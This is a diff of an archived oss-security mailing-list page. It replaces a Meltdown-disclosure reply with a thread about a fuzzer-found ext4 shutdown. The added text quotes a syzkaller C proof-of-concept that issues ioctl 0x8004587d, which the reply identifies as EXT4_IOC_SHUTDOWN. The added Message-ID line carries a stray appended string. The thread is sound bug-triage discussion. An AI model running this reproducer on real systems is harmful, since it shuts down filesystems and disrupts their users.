@@ -1,25 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/19/5
-Message-ID: <20180119135837.GA1212@kroah.com>
-Date: Fri, 19 Jan 2018 14:58:37 +0100
-From: Greg KH <greg@...ah.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/28/5
+Message-ID: <20180828094537.GA10578@localvm.private.f2light.com>+6A304428CF1ACB2B
+Date: Tue, 28 Aug 2018 17:45:37 +0800
+From: Xiami <pengyu.tao@...li.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: How to deal with reporters who don't want their bugs fixed?
+Subject: Re: Linux kernel: FS_IOC_FSSETXATTR will lead to EXT4-fs shut down
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Jan 19, 2018 at 05:22:58AM -0800, i@...udlinux.com wrote:
-> We have seen "semi-public" with Meltdown -- I think it was dreadful. I
-> would prefer private to "semi-public" any day.
+On Tue, Aug 28, 2018 at 08:27:50AM +0000, zhrzhang(张洪睿) wrote:
+> Hello：
+>         when I fuzz，I found the kernel will always no output from machine, and error FS_IOC_FSSETXATTR contribute to this.
+> 
+>         the syzlog is as below:
+> 
+> r0 = creat(&(0x7f0000000140)='./file0\x00', 0x0)
+> ioctl$FS_IOC_FSSETXATTR(r0, 0x8004587d, &(0x7f0000000080)={0x0, 0x0, 0x0, 0x8})
 
-Meltdown was not semi-public, it was private and siloed and a whole
-bunch of other horrible things.  If it were semi-public, we would have
-had it fixed sooner :)
+Your ioctl command 0x8004587d is exactly EXT4_IOC_SHUTDOWN defined in fs/ext4/ext4.h
 
-And yes, a number of us involved are probably going to be writing up a
-post-mortum of that whole horrid affair, feel free to let me know if
-anyone wants to help out with it.  I think it's a great example of what
-not to ever do in the future...
+> 
+>         the poc will show like this:
+> 
+> #define _GNU_SOURCE
+> 
+> #include <endian.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <unistd.h>
+> 
+> uint64_t r[1] = {0xffffffffffffffff};
+> 
+> int main(void)
+> {
+> syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+> long res = 0;
+> memcpy((void*)0x20000140, "./file0", 8);
+> res = syscall(__NR_creat, 0x20000140, 0);
+> if (res != -1)
+> r[0] = res;
+> *(uint32_t*)0x20000080 = 0;
+> *(uint32_t*)0x20000084 = 0;
+> *(uint32_t*)0x20000088 = 0;
+> *(uint32_t*)0x2000008c = 8;
+> *(uint32_t*)0x20000090 = 0;
+> *(uint64_t*)0x20000098 = 0;
+> syscall(__NR_ioctl, r[0], 0x8004587d, 0x20000080);
+> return 0;
+> }
+> ________________________________
+> zhrzhang(张洪睿)
 
-thanks,
 
-greg k-h
